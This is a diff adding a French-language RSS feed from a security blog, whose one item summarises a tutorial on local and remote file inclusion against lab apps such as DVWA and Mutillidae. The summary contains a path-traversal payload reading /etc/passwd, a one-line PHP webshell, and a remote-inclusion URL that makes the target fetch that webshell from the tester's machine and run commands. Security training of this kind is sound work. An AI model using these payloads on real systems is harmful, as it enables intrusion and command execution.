@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>RFI on LOLOLEKIK</title>
+    <link>http://lololekik.com/tags/rfi/</link>
+    <description>Recent content in RFI on LOLOLEKIK</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>fr</language><atom:link href="http://lololekik.com/tags/rfi/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Web - File Inclusion</title>
+      <link>http://lololekik.com/cuisine/lfi/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/lfi/</guid>
+      <description>Introduction Les file inclusion permettent de chercher des fichiers localement (LFI) ou sur un serveur distant (RFI) afin de les afficher.
+LFI payload
+http://192.168.1.91/mutillidae/index.php?page=../../../../../../../../../../etc/passwd  RFI &amp;amp; Simple WEBSHELL Sur notre machine on créé un fichier lololekik.php
+&amp;lt;?php shell_exec($_GET[&amp;#39;lolo&amp;#39;]) ?&amp;gt;Démarrage du serveur web
+┌──(lololekik㉿Ashitaka)-[~/metasploitable] └─$ python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... Puis utiliser la commande suivante pour utiliser le webshell
+http://192.168.1.91/dvwa/vulnerabilities/fi/?page=http://192.168.1.86:8000/lololekik.php&amp;amp;lolo=ifconfig LFI &amp;amp; Log poisonning Il est possible de contaminer plusieurs fichiers de log voici l&amp;rsquo;exemple avec /var/log/apache2/access.</description>
+    </item>
+    
+  </channel>
+</rss>
